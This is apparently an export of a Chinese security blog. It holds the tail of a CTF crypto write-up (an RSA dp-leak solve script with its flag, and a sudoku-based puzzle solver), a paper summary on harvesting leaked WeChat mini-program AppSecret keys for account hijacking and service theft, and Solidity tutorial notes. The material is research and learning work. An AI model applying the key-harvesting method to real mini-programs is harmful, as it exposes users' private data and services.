class="number">78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">p = <span class="number">12131601165788024635030034921084070470053842112984866821070395281728468805072716002494427632757418621194662541766157553264889658892783635499016425528807741</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425</span></span><br><span class="line">dp = <span class="number">379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473</span></span><br><span class="line">b = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">mp1 = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">	x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp1, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">	y = <span class="built_in">pow</span>(x * mp * (gmpy2.invert(e, p)), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">	mp1 = mp1 + y</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(mp1))</span><br><span class="line"><span class="comment">#b&#x27;DASCTF&#123;98d923h4344e3bf72f8775xy65tvftv5&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="密码人集合">密码人集合</h1>
<p>yysy，前一部分给我看湿了，密码人平时还挺孤独的。</p>
<p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2FJ5@Z%7BW%5DZ91X1FN6IO2CV.png" alt="img"></p>
<p>泪目</p>
<p>就做题而言不算困难，在网上抄个数独脚本就能出了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line">sys.setrecursionlimit(<span class="number">100000</span>) <span class="comment"># 发现python默认的递归深度是很有限的</span></span><br><span class="line">                              <span class="comment">#（默认是1000），因此当递归深度超过999的</span></span><br><span class="line">                              <span class="comment"># 样子，就会引发这样的一个异常。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_next</span>(<span class="params">m, x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 功能：获得下一个空白格在数独中的坐标。       </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> next_y <span class="keyword">in</span> <span class="built_in">range</span>(y+<span class="number">1</span>, <span class="number">9</span>):  <span class="comment"># 下一个空白格和当前格在一行的情况</span></span><br><span class="line">        <span class="keyword">if</span> m[x][next_y] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> x, next_y</span><br><span class="line">    <span class="keyword">for</span> next_x <span class="keyword">in</span> <span class="built_in">range</span>(x+<span class="number">1</span>, <span class="number">9</span>):  <span class="comment"># 下一个空白格和当前格不在一行的情况</span></span><br><span class="line">        <span class="keyword">for</span> next_y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> m[next_x][next_y] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> next_x, next_y</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span>               <span class="comment"># 若不存在下一个空白格，则返回 -1，-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">value</span>(<span class="params">m, x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 功能：返回符合&quot;每个横排和竖排以及</span></span><br><span class="line"><span class="string">              九宫格内无相同数字&quot;这个条件的有效值。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> </span><br><span class="line">    i, j = x//<span class="number">3</span>, y//<span class="number">3</span></span><br><span class="line">    grid = [m[i*<span class="number">3</span>+r][j*<span class="number">3</span>+c] <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    v = <span class="built_in">set</span>([x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>)]) - <span class="built_in">set</span>(grid) - <span class="built_in">set</span>(m[x]) - \</span><br><span class="line">        <span class="built_in">set</span>(<span class="built_in">list</span>(<span class="built_in">zip</span>(*m))[y])    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_pos</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 功能：返回第一个空白格的位置坐标&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> m[x][y] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> x, y</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">False</span>  <span class="comment"># 若数独已完成，则返回 False, False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_sudoku</span>(<span class="params">m, x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 功能：试着填写数独 &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> value(m, x, y):</span><br><span class="line">        m[x][y] = v</span><br><span class="line">        next_x, next_y = get_next(m, x, y)</span><br><span class="line">        <span class="keyword">if</span> next_y == -<span class="number">1</span>: <span class="comment"># 如果无下一个空白格</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = try_sudoku(m, next_x, next_y) <span class="comment"># 递归</span></span><br><span class="line">            <span class="keyword">if</span> end:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            m[x][y] = <span class="number">0</span> <span class="comment"># 在递归的过程中，如果数独没有解开，</span></span><br><span class="line">                        <span class="comment"># 则回溯到上一个空白格</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sudoku</span>(<span class="params">m</span>):        </span><br><span class="line">    x, y = start_pos(m)</span><br><span class="line">    try_sudoku(m, x, y)</span><br><span class="line">    <span class="built_in">print</span>(m)     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    m = m = [</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    ]</span><br><span class="line">    sudoku(m)</span><br><span class="line">    a=[[<span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">6</span>], [<span class="number">6</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>], [<span class="number">7</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>], [<span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">3</span>], [<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>], [<span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">1</span>], [<span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>], [<span class="number">1</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, </span><br><span class="line"><span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>]]</span><br><span class="line">    my_dic= &#123;<span class="number">1</span>:<span class="string">&#x27;我&#x27;</span>, <span class="number">2</span>:<span class="string">&#x27;要&#x27;</span>,<span class="number">3</span>:<span class="string">&#x27;拿&#x27;</span>,<span class="number">4</span>:<span class="string">&#x27;西&#x27;</span>,<span class="number">5</span>:<span class="string">&#x27;湖&#x27;</span>,<span class="number">6</span>:<span class="string">&#x27;论&#x27;</span>,<span class="number">7</span>:<span class="string">&#x27;剑&#x27;</span>,<span class="number">8</span>:<span class="string">&#x27;第&#x27;</span>,<span class="number">9</span>:<span class="string">&#x27;一&#x27;</span>&#125;</span><br><span class="line">    re=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="built_in">print</span>(my_dic[a[i][j]],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;m = [</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0]</span></span><br><span class="line"><span class="string">    ]&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="随便写点">随便写点</h1>
<p>维纳压根没看。。</p>
<p>curve那题发现add（）是可逆的，一开始估计和祥云杯那题有点类似，但是不知道该怎么解出e啊，折磨，后来发现add（G）的规律，只能知道e%4
= 1，不知道有没有用。</p>
<p>nfsr那题bob找了几个脚本都没跑出来，因为这次mask是64byte的，应该是要用快速相关攻击？</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>Pell Equation</tag>
        <tag>离散对数</tag>
        <tag>DSA</tag>
      </tags>
  </entry>
  <entry>
    <title>小程序论文阅读笔记</title>
    <url>/2023/08/15/2023/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>论文记录</p>
<span id="more"></span>
<h1 id="dont-leak-your-keys-understanding-measuring-and-exploiting-the-appsecret-leaks-in-mini-programs">Don’t
Leak Your Keys: Understanding, Measuring, and Exploiting the AppSecret
Leaks in Mini-Programs</h1>
<p>小程序，挂在app上，其因规模小、功能丰富的原因，在市场上大受欢迎，这也让app成为了super
app，就像为软件提供平台的操作系统一样。同时，作为一种应用，小程序需要通过特定的api来访问后端或云上的数据或服务，也因此，小程序后端的master
key(MS)至关重要，它对于小程序来说几乎是root权限的存在，要将MS保存在后端而不能发往前端，否则会造成严重的后果，本文便是基于这个思路所写。</p>
<p>接下来，文章以微信为例，介绍了微信上的小程序的预备知识，下图1是小程序的常用api和云服务，例如获取手机号（在中国，一个app上的手机号即绑定了一个公民的身份）、用户信息，亦或是使用OCR、安全服务等：</p>
<p><img src="/images/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230815110554834.png" style="zoom:50%;"></p>
<p>相较于传统的app和web服务，小程序天然带有一系列密钥管理和访问协议，确保密钥不会被非法获取，下图是小程序业务流程中主要涉及的四个密钥：</p>
<p><img src="/images/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230815111523583.png" style="zoom:50%;"></p>
<p>在一次敏感数据访问，通常的业务逻辑是这样的：首先小程序前端（MF）向微信客户端（WC）请求Login
Token(LT)，WC向微信服务端(WS)请求得到后发给MF，MF再利用LT向小程序后端(MB)发起登陆请求；随后，MB把LT,
MK,
appID发给WC得到加密密钥(EK)；同时MF再次通过WC从WS得到用户的数据，只不过是用EK加密后的密文C。最后，MF把C传给MB，MB用EK对其进行解密，完成一次敏感数据访问。该协议可由下图概括：</p>
<p><img src="/images/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230815112258234.png" style="zoom:50%;"></p>
<p>与之相比，云服务访问协议就简单很多，只在MB和WS之间发生：只需要MB向WS请求得到AT，即可用AT调用服务：</p>
<p><img src="/images/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230815112511761.png" style="zoom:50%;"></p>
<p>接下来，作者介绍了小程序密钥的威胁模型，即上述四个密钥的作用和泄露带来的危害；这篇文章聚焦于MK的泄露，因为MK泄露总是能造成EK和AT的泄露，攻击者便可以访问隐私数据以及免费享受云服务功能。</p>
<p>终于到方法论的部分了，作者基于以下五个问题展开：</p>
<ul>
<li>问题 1：MK 泄露小程序的类别是什么？</li>
<li>问题 2：它们的评级如何？</li>
<li>问题 3：它们获取了哪些资源？</li>
<li>问题 4：它们的开发者是谁？</li>
<li>问题 5：它们的最新更新时间是什么时候？</li>
<li>问题 6：是否有备受瞩目的小程序存在MK泄露？</li>
</ul>
<p>首先便是数据收集环节，作者通过“Mp.wx.qq.com/wxa-cgi/innersearch”
API来批量下载小程序，得到了3,450,586个小程序（太可怕了）。在获取前端代码后，去寻找里面的32个16进制字符串，通过“Api.weixin.qq.com/cgi-bin/token”
API确定是否为MK，得到的结果是40,880个小程序存在MK泄露的问题。得到数据集，便可进行分析，回答上述五个问题：</p>
<ul>
<li>泄露MK的小程序种类多种多样，生活方式和购物类占比最高，工具、政府和游戏类数量较多。</li>
<li>作者基于用户的评分对小程序评级，结果表明，低评级的小程序更容易存在MK泄露。</li>
<li>有24,701个小程序可以通过MK泄露被账户劫持、推广滥用、服务窃取（这些攻击会在下面介绍）；同时6,907个小程序没有这样的问题，但不保证以后也不会有。</li>
<li>大多公司只开发了一个存在这种问题的小程序，但也有开发了30个的。</li>
<li>自微信引入小程序的第一年，就存在MK泄露的问题；随着时间推移，漏洞小程序数量在减少。</li>
<li>一些高知名度的公司在多个小程序中犯了同样的错误（如雀巢）；
微信提供商腾讯是小程序中出现 MK
泄露的排名第一的公司；一些高知名度公司的小程序只泄露了
MK，而没有访问敏感信息。</li>
</ul>
<p>然后，作者提出了基于MK泄露的两种攻击，一种是针对敏感数据的，如账户劫持、推广滥用，另一种是针对云服务的，如服务窃取。作者不仅提出攻击，还提出了修复意见和推广这个研究到其他app上，以及表明自己在研究过程中遵守了道德准则，例如每分钟只发送六个爬取小程序的请求、限制确认MK的线程数、保证只使用自己的账户。</p>
<p>最后，介绍了一下近几年有关小程序和密钥泄露的相关研究，并提出总结。</p>
<h1 id="a-measurement-study-of-wechat-mini-apps">A Measurement Study of
Wechat Mini-Apps</h1>
<p>这一篇是2021年zhangyue老师的论文，介绍了他们开发的分析微信小程序的工具MiniCrawler，篇幅较短只有2页</p>
<p>引入了小程序的背景后，开始介绍他们的工具，总共分为三个部分：</p>
<ol type="1">
<li>元数据爬虫：接受一系列关键词，通过微信的api爬取小程序的信息</li>
<li>关键词生成器：使用NLP技术分析小程序的名称和描述，生成高质量的关键词</li>
<li>包下载器：根据appid下载小程序的包</li>
</ol>
<p>拿到包后，便可以统计小程序的信息，做出归纳推理，文中统计了小程序的大小、常用api、类型、rating(评分？)</p>
]]></content>
      <categories>
        <category>论文阅读笔记</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>miniapp</tag>
      </tags>
  </entry>
  <entry>
    <title>智能合约</title>
    <url>/2023/05/08/2023/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</url>
    <content><![CDATA[<p>之前做审计的时候都是碰到什么学什么，这样的代价就是基础很差，
要一直搜重复的东西，所以决定好好读一遍<a href="https://learnblockchain.cn/docs/solidity/">Solidity 中文文档 —
Solidity中文文档 — 登链社区
(learnblockchain.cn)</a>，然后再搞别的，预期这个月以内</p>
<span id="more"></span>
<p>[toc]</p>
<h1 id="solidity源文件结构">Solidity源文件结构</h1>
<p>源文件中可以包含任意数量的 合约定义 , 源文件引入 , pragma 、 using
for 指令和 struct , enum , function , error 以及常量定义。</p>
<h2 id="spdx版本许可标识">SPDX版本许可标识</h2>
<p>全称为“The Softwaere Package Data Exchange"，用来说明其版权许可证</p>
<p><code>// SPDX-License-Identifier: MIT</code></p>
<h2 id="版本标识">版本标识</h2>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pragma</span></span><br></pre></td></tr></table></figure>
<p>Pragma 是 pragmatic information
的简称，启用编译检查功能，检查版本是否匹配，例如</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">pragma</span> solidity ^<span class="number">0</span>.<span class="number">5</span>.<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<p>表示可被大于等于0.5.2且小于0.6.0的版本编译。</p>
<h2 id="导入其他源文件">导入其他源文件</h2>
<p>solidity支持导入语句来模块化代码</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;filename&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>filename</code>被称为导入路径</p>
<p>但不建议使用这种形式，它会把导入路径中的全局符号都导入到当前全局作用域，会无法预测的污染当前命名空间，可以使用如下形式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import * as symbolName from “filename”;</span><br><span class="line">//两种方式等价</span><br><span class="line">import &quot;filename&quot; as symbolName;</span><br></pre></td></tr></table></figure>
<p>如果存在命名冲突，可以在导入时重命名符号。下面代码就创建了新的全局符号<code>alias</code>和<code>symbol2</code>，引用的<code>symbol1</code>和<code>symbol2</code>来自”filename“。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;symbol1 <span class="keyword">as</span> <span class="keyword">alias</span>, symbol2&#125; <span class="keyword">from</span> &quot;filename&quot;;</span><br></pre></td></tr></table></figure>
<h2 id="注释">注释</h2>
<p>可以使用单行注释（ <code>//</code> ）和多行注释（
<code>/*...*/</code> ）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//这是一个单行注释</span><br><span class="line">/*</span><br><span class="line">这是一个</span><br><span class="line">多行注释。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p>此外，还有一种注释叫做 NatSpec 注释，用三斜线（ <code>///</code>
）或双星号块（ <code>/** ... */</code> ）来写，
它们应该直接用在函数声明或语句的上方。</p>
<h1 id="合约结构">合约结构</h1>
<p>在 Solidity 中，合约类似于面向对象编程语言中的类。 每个合约中可以包含
状态变量， 函数， 函数修饰器， 事件， 错误， 结构类型 和 枚举类型
的声明，且合约可以从其他合约继承。</p>
<p>还有一些特殊种类的合同，叫做 库合约 和 接口合约。</p>
<h2 id="状态变量">状态变量</h2>
<p>状态变量是指其值被永久地存储在合约存储中的变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData; // 状态变量</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="函数function">函数（function）</h2>
<p>函数是代码的可执行单位。
通常在合约内定义函数，但它们也可以被定义在合约之外。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.7.1 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleAuction &#123;</span><br><span class="line">    function bid() public payable &#123; // 函数</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 定义在合约之外的辅助函数</span><br><span class="line">function helper(uint x) pure returns (uint) &#123;</span><br><span class="line">    return x * 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="函数修饰器modifier">函数修饰器（modifier）</h2>
<p>函数修饰器可以被用来以声明的方式修改函数的语义</p>
<p>具有同一个modifier的名字但参数不同是不可能的；但是modifier可以被重载/覆写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.22 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    address public seller;</span><br><span class="line"></span><br><span class="line">    modifier onlySeller() &#123; // 修饰器</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == seller,</span><br><span class="line">            &quot;Only seller can call this.&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function abort() public view onlySeller &#123; // 修饰器的使用</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="事件event">事件（event）</h2>
<p>事件是能方便地调用以太坊虚拟机日志功能的接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.21 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleAuction &#123;</span><br><span class="line">    event HighestBidIncreased(address bidder, uint amount); // 事件</span><br><span class="line"></span><br><span class="line">    function bid() public payable &#123;</span><br><span class="line">        // ...</span><br><span class="line">        emit HighestBidIncreased(msg.sender, msg.value); // 触发事件</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="错误error">错误（error ）</h2>
<p>error为失败情况定义描述性的名称和数据，可以在回滚（revert等）中使用。与字符串相比，error要便宜的多（消耗的gas少），并允许对额外的数据进行编码。可以使用
NatSpec 格式来向用户描述错误。</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 没有足够的资金用于转账。要求 `requested`。</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 但只有 `available` 可用。</span></span><br><span class="line"><span class="function">error <span class="title">NotEnoughFunds</span>(<span class="params"><span class="built_in">uint</span> requested, <span class="built_in">uint</span> available</span>)</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; <span class="built_in">uint</span>) balances;</span><br><span class="line">    <span class="function">function <span class="title">transfer</span>(<span class="params">address to, <span class="built_in">uint</span> amount</span>) <span class="keyword">public</span></span> &#123;</span><br><span class="line">        <span class="built_in">uint</span> balance = balances[msg.sender];</span><br><span class="line">        <span class="keyword">if</span> (balance &lt; amount)</span><br><span class="line">            <span class="function">revert <span class="title">NotEnoughFunds</span>(<span class="params">amount, balance</span>)</span>; <span class="comment">//回滚 error</span></span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[to] += amount;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="结构类型struct">结构类型（struct）</h2>
<p>结构类型是可以将几个变量分组的自定义类型，和c语言一样的</p>
<figure class="highlight d"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line"><span class="keyword">pragma</span> solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt;<span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Ballot &#123;</span><br><span class="line">    <span class="keyword">struct</span> Voter &#123; <span class="comment">// 结构</span></span><br><span class="line">        <span class="built_in">uint</span> weight;</span><br><span class="line">        <span class="built_in">bool</span> voted;</span><br><span class="line">        address <span class="built_in">delegate</span>;</span><br><span class="line">        <span class="built_in">uint</span> vote;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="枚举类型enum">枚举类型（enum）</h2>
<p>enum可用来创建由一定数量的'常量值'构成的自定义类型</p>
